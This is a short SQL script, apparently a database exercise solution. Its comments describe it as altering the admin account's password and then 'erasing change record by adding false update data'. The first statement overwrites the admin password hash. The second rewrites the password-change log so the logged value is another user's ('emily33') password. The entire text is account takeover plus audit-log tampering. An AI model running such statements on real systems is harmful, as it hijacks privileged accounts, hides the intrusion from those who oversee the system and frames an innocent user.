-- altering admin's password

UPDATE "users" set "password" = '982c0381c279d139fd221fce974916e7'
WHERE "username" = 'admin';

-- erasing change record by adding false update data

UPDATE "user_logs" SET "new_password" = (
    SELECT "password" FROM "users"
    WHERE "username" = 'emily33'
)
WHERE "type" = 'update'
AND "old_username" = 'admin'
AND "old_password" IS NOT NULL;

